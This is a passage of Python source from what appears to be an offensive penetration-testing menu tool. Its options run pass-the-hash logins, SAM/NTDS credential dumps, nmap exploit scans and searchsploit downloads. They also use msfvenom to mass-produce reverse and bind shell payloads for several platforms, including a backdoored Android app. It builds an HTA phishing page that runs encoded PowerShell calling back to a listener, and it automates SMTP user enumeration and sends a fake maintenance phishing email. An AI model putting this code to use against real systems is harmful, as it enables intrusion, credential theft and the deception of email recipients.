               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
            checkParam = test_PRT("445")
            if checkParam != 1:
               print("\n[+] Checking priviliges...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami /priv")
               print("\n[+] Enumerating users...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
               print("\n[+] Enumerating shares...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
               print("\n[+] Enumerating sessions...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
               print("\n[+] Enumerating SAM...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
               print("\n[+] Enumerating NTDS...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
      prompt()	# EOF Error here for some reason?
               
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n", colour3))
         remoteCOM(keyPath + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n", colour3))
         remoteCOM(keyPath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='70':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()         
      if checkParam != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n", colour3))
         remoteCOM(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nikto scan
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='71':
      print(colored("[*] Service scanning host, please wait this can take sometime...", colour3))
      checkParam = test_WEB()
      if checkParam != 1:
         if WEB[:5].upper() == "HTTPS":
            if (USR.rstrip(" ") != "''") or (PAS.rstrip(" ") != "''"):
               remoteCOM("nikto -ssl   -h " + WEB.rstrip(" ") + " -id " + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
            else:
               remoteCOM("nikto -ssl   -h " + WEB.rstrip(" "))            
         else:
            if (USR.rstrip(" ") != "''") or (PAS.rstrip(" ") != "''"):
               remoteCOM("nikto -nossl -h " + WEB.rstrip(" ")  + " -id " + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
            else:
               remoteCOM("nikto -nossl -h " + WEB.rstrip(" "))
      else:
         if IP46 == "-4":
            checkParam = test_TIP()
         else:
            checkParam = test_DOM()
         if checkParam != 1:   
            if ":" in TIP:
               if (USR.rstrip(" ") != "''") or (PAS.rstrip(" ") != "''"):
                  remoteCOM("nikto -h " + DOM.rstrip(" ")  + " -id " + USR.rstrip(" ") + ":" + PAS.rstrip(" "))	# IP 6 ISSUES
               else:               
                  remoteCOM("nikto -h " + DOM.rstrip(" "))	# IP 6 ISSUES
            else:
               if (USR.rstrip(" ") != "''") or (PAS.rstrip(" ") != "''"):
                  remoteCOM("nikto -h " + TIP.rstrip(" ") + " -id " + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
               else:
                  remoteCOM("nikto -h " + TIP.rstrip(" ") + " -id " + USR.rstrip(" ") + ":" + PAS.rstrip(" "))               
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap vuln #nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='72':
      checkParam = test_TIP()
      if checkParam != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
            remoteCOM("nmap -sV -p " + PTS.rstrip(" ") + " --reason --script *vuln* --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")           
            catsFile("light.tmp")
         else:
            print("[-] No ports to scan...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap exploit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='73':
      checkParam = test_TIP()
      if checkParam != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
            remoteCOM("nmap -sV -p " + PTS.rstrip(" ")  + " --reason --script exploit --script-args *vuln* " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
            catsFile("light.tmp")
         else:
            print("[-] No ports to scan...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Searchsploit service
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '74':
      services = input("[?] Please enter service name: ")
      localCOM("searchsploit '" + services + "' > sploit.tmp")      
      nullTest = linecache.getline("sploit.tmp",1)      
      if "Exploits: No Results" in nullTest:
         print("[-] No exploits were found for service " + services + "...")
         nullTest = linecache.getline("sploit.tmp",2)
         if "Shellcodes: No Results" in nullTest:
            print("[-] No shellcodes were found for service " + services + "...")         
      else:
         print("[+] Exploits found...")
         catsFile("sploit.tmp") 
         services = input("[?] Please enter service name to download: ")
         localCOM("searchsploit -m '" + services + "'")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Exploit creater
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='75':                 
      checkParam = getPort()      
      if checkParam != 1:
         if OSF[:7] == "WINDOWS":
            print(colored("[*] Creating microsoft windows exploits...", colour3))
            if not os.path.exists(explDir + "/staged"):
               localCOM("mkdir " + explDir + "/staged")
            if not os.path.exists(explDir + "/stageless"):
               localCOM("mkdir " + explDir + "/stageless")
            print("[+] Manufacturing staged exploits...")   
            localCOM("msfvenom -p windows/x64/shell/reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x64_shell_reverse_tcp.exe > arsenal.tmp 2>&1")
            localCOM("msfvenon -p windows/shell/reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParam + " -f vba   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")         
            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
            if TIP[:5] != "EMPTY":
               localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
               localCOM("msfvenom -p windows/meterpreter/bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f exe   -o " + explDir + "/staged/windows/x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
            print("[+] Manufacturing stageless exploits...")                            
            localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x64_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORP=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter_reverse_http       LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter_reverse_http           LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter_reverse_https      LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter_reverse_https          LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter_reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParam + " -f vba   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/meterpreter_reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p windows/x64/meterpreter_reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")           
            localCOM("msfvenom -p windows/meterpreter_reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
            if TIP[:5] != "EMPTY":
               localCOM("msfvenom -p windows/x64/meterpreter_bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
               localCOM("msfvenom -p windows/meterpreter_bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")

#            localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParam + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
#            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParam + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
            
         if OSF[:5] == "LINUX":
            print(colored("[*] Creating linux exploits...", colour3))
            localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_tcp.elf>> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_tcp.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x86_meterpreter_bind_tcp.elf >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f elf   -o " + explDir + "/linux_x66_shell_bind_tcp.elf >> arsenal.tmp 2>&1")         

         if OSF[:7] == "ANDROID":
            print(colored("[*] Creating android exploits...", colour3))
#           localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParam + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
            localCOM("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParam + "          -o " + explDir + "/android_meterpreter_reverse_tcp.apk >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParam + " R        -o " + explDir + "/android_meterpreter_reverse_http.apk >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParam + " R        -o " + explDir + "/android_meterpreter_reverse_https.apk >> arsenal.tmp 2>&1")         
         if OSF[:4] == "OS X":
            print(colored("[*] Creating mac exploits...", colour3))
            localCOM("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParam + " -f macho -o " + explDir + "/osx_x86_shell_reverse_tcp.macho >> arsenal.tmp 2>&1")
            localCOM("msfvenom -p osx/x86/shell_bind_tcp                     RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParam + " -f macho -o " + explDir + "/osx_x86_shell_bind_tcp.macho >> arsenal.tmp 2>&1")
         if OSF[:3] == "IOS":
            print(colored("[*] Creating ios exploits...", colour3))
            print("NOT IMPLEMENTED")            

         print(colored("[*] Creating other exploits that you might require...", colour3))
         localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParam + " -f asp    -o " + explDir + "/windows_meterpreter_reverse_tcp.asp >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParam + " -f aspx   -o " + explDir + "/windows_meterpreter_reverse_tcp.aspx >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParam + " -f war    -o " + explDir + "/java_jsp_shell_reverse_tcp.war >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/cmd_unix_reverse_bash.sh >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/cmd_unix_reverse_python.py >> arsenal.tmp 2>&1")
         localCOM("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParam + " -f raw    -o " + explDir + "/cmd_unix_reverse_perl.pl >> arsenal.tmp 2>&1")
         localCOM("chmod +X *.*")
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
# Modified: N/A
# Note    : Alternative dictionary - alternative /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt /usr/share/seclists/Discovery/Web-Content/common.txt
# -------------------------------------------------------------------------------------

   if selection =='76':
      print(colored("[*] Scanning for directories and files, please wait this will take a long time...", colour3))   
      checkParam = test_WEB()
      if checkParam != 1:
         target = WEB.rstrip(" ")
         print("[+] Using word list " + currentWordlist + "...") 
         print("[+] Using URL address " + target + "...")
      else:
         target = TIP.rstrip(" ")
         print("[+] Using word list " + currentWordlist + "...") 
         print("[+] Using IP address " + target + "...")
      remoteCOM("feroxbuster -u " + target + " -x " + fileExt + " -w " + currentWordlist + " -t 50 -o dir.tmp -q -k") # --silent
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - SNMP Walker
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='77':
      checkParam = test_PRT("161")      
      if checkParam != 1:
         print(colored("[*] Checking SNMP version...", colour3))
         remoteCOM("nmap -sU -sV -p 161 " + TIP.rstrip(" "))     
         print(colored("[*] Enumerating 'v2c' " + communityString.rstrip(" ") + " communities only...", colour3))   
         print(colored("[*] Checking community string " + communityString + "...", colour3))               
         print("[+] Checking system processes...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.1.6.0 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Checking running processes...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.2 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Checking running systems...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.4 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Checking storage units...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.2.3.1.4 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Checking software names...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.6.3.1.2 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Checking user accounts...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.4.1.77.1.2.25 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Checking local ports...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > " + communityString.rstrip(" "))
         catsFile(communityString.rstrip(" "))      
         print("[+] Enumerating the entire MIB tree, please wait this may take sometime...")
         remoteCOM("snmpwalk -v2c -c " + communityString.rstrip(" ") + " "  + TIP.rstrip(" ") + " > " + communityString.rstrip(" ") + ".txt")    
         print("[+] Interesting finds...")
         localCOM("grep password " + communityString.rstrip(" ") + ".txt > find.tmp")
         localCOM("grep user " + communityString.rstrip(" ") + ".txt >> find.tmp")
         catsFile("find.tmp")      
         print("[+] Enumeration file temporary saved as " + communityString.rstrip(" ") + ".txt for manual perusal...")
         prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Manual Phising...
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='78':
      checkParam = getPort()
      if HTTP == 0:
         print("[-] You need to start the HTTP server first...")
         checkParam = 1               
      if checkParam != 1:    
         print(colored("[*] Starting phishing server...", colour3))               
         localCOM("xdotool key Ctrl+Shift+T")
         localCOM("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
         dispBanner("GONE PHISHING",0)
         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
         localCOM("xdotool type 'rlwrap nc -nvlp " + checkParam + "'; xdotool key Return")
         localCOM("xdotool key Ctrl+Tab")            
         payLoad = f"""      
         a=new ActiveXObject("WScript.Shell");
         a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParam)}", 0);window.close();
         """.encode()            
         bpayLoad = base64.b64encode(payLoad)
         final = encrypt(bpayLoad)                  
         with open('payrise.hta', 'w') as hta:
            hta.write(body(final))         
         print("[+] Exploit created, utilise the following code snippet to activate...")
         print(colored("\nhttp://" + localIP + ":" + HTTP + "/payrise.hta",colour6))          
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Automated phisher.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='79':
      if HTTP != 0:
         checkParam = test_TIP()      
         if checkParam != 1:
            checkParam = test_DOM()         
         if checkParam != 1:
            checkParam = test_PRT("25")         
         if checkParam != 1:
            checkParam = getPort()                 
            if checkParam != 1:
               print("\n- - - - - - - - - - - - - - - - - - - - - - -")
               print("Target   : " + TIP.rstrip(" "))
               print("Sender   :", end=' ')
               if USR[:1] == "'":
                  print("it@" + localIP + " (defualt)")
               else:
                  print(USR.rstrip(" "))
               print("Recipient: usernames.txt")
               print("Domain   : " + DOM.strip(" "))
               print("- - - - - - - - - - - - - - - - - - - - - - -\n")
               print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               try:
                  connect = s.connect((TIP.rstrip(" "),25))
                  print("[+] Succesfully connected to " + TIP.rstrip(" ") + ":25...\n")
               except:
                  print("[+] Unable to connect to " + TIP.rstrip(" ") + ":25...\n")
                  prompt()
                  break 
               bannerResponce = s.recv(1024)
               print(colored(bannerResponce, colour6))                     
               print("\n[+] Saying hello...\n")
               if "ESMTP" in str(bannerResponce):
                  string = "EHLO RogueAgent\r\n"
               else:
                  string = "HELO RogueAgent\r\n"
               s.send(bytes(string.encode()))
               helloResponce = s.recv(1024)
               print(colored(helloResponce, colour6))            
               print("\n[+] Specifying my email address...\n")
               string = "MAIL FROM:<rogueagent@kali.domain>\r\n"
               s.send(bytes(string.encode()))
               mailResponce = s.recv(1024)
               print(colored(mailResponce, colour6))               
               print("\n[+] Trying recipient email address root@" + DOM.rstrip(" ") + "...\n")
               string = "RCPT TO:<root@" + DOM.rstrip(" ") + ">\r\n"
               s.send(bytes(string.encode()))
               rcptResponce = s.recv(1024)
               print(colored(rcptResponce, colour6))            
               print("\n[+] Asking for help...\n")            
               string = "HELP\r\n"
               s.send(bytes(string.encode()))
               helpResponce = s.recv(1024)
               print(colored(helpResponce, colour6))            
               print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
               count = lineCount(dataDir + "/usernames.txt")
               localCOM("touch valid.tmp")
               for x in range(0, count):
                  data = linecache.getline(dataDir + "/usernames.txt", x + 1)
                  string = "VRFY " + data.rstrip("\n") + "\r\n"
                  try:
                     s.send(bytes(string.encode()))
                     bruteCheck = s.recv(1024)
                  except:
                     print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
                  if "550" not in str(bruteCheck):
                     localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")
               nullTest = linecache.getline("valid.tmp",1)
               if nullTest != "":
                  print("[+] Valid usernames found...")
                  catsFile("valid.tmp")
                  check = 0
               else:
                  print("[-] No valid usernames found...")
                  check = 1                  
               print("[+] Saying goodbye...\n")            
               string = "QUIT\r\n"
               try:
                  s.send(bytes(string.encode()))
                  quitResponce = s.recv(1024)
                  print(colored(quitResponce, colour6)) 
               except:
                     print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))   
               s.close()            
               if check != 1:
                  print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
                  localCOM('echo "Subject: Immediate action required\n" > body.tmp')
                  localCOM('echo "Hello.\n" >> body.tmp')
                  localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
                  localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
                  localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParam + '"/img\">" >> body.tmp')
                  localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParam + '"/" >> body.tmp')
                  localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParam + '"\">click me.</a>" >> body.tmp')
                  localCOM('echo "\nRegards," >> body.tmp')
                  if USR[:1] == "'":
                     localCOM('echo it@' + DOM.rstrip(" ") + ' >> body.tmp')
                     sender = "it"
                  else:
                     localCOM('echo ' + USR.rstrip(" ") + '@' + localIP + ' >> body.tmp')
                     sender = USR.rstrip(" ")
                  catsFile("body.tmp")
                  print(colored("[*] Phishing the valid username list...", colour3))
                  parsFile("valid.tmp")
                  with open("valid.tmp", "r") as list:
                     for phish in list:
                        phish = phish.rstrip("\n")
                        phish = phish.strip(" ")
                        phish = phish + "@"
                        phish = phish + DOM.rstrip(" ")
                        try:
                           remoteCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                           print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
                        except:
                           print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
      else:
         print("[-] You need to start the smtpd server first...")
      prompt()  

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='80':          
      print("\nA NEW METERSPLOIT INTERFACE IS BEING DEVELOPED.") 
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

# - HERE 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Proxychain ON/OFF [KEEP HERE]
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='82':        
      if proxyChains == 0:
         proxyChains = 1
         print("[+] Proxychains activated...")
      else:
         proxyChains = 0
         print("[-] Proxychains de-activated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
